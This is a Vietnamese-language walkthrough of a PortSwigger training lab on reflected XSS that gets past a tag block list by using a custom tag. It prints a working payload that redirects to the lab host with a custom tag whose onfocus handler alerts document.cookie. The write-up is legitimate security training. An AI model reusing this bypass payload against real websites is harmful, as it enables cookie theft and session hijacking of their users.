# Lab: Reflected XSS into HTML context with all tags blocked except custom ones

**Lab URL:** [PortSwigger Lab](https://portswigger.net/web-security/cross-site-scripting/contexts/lab-html-context-with-all-standard-tags-blocked)

## Mô tả

Bài Lab này cũng tương tự như phần chặn hầu hết các tags và attribute, tuy vậy nó sẽ cho ta sử dụng custom tags. Lab yêu cầu ta thực hiện alert ra *document.cookie*.

## Phân tích

Vì nó đã block hết tags nên ta không thể truyền script vào được:

![Block các tags](html-context-custom-tags-allowed/blocked-tag.png)

## Khai thác

Thế thì ta chỉ cần custom cái tag lại và Delivery đến lab:

`Payload: <script> location='https://ac431f2f1efc3d82c04819bd00a6002d.web-security-academy.net/?search=<nh4ttruong+id=x+onfocus=alert(document.cookie)+tabindex=1>#x'; </script>`

Dùng `onfocus` để trigger đến alert, dùng #x để trỏ ngay đến id của tag.

## Kết quả

![Solved](html-context-custom-tags-allowed/solved.png)
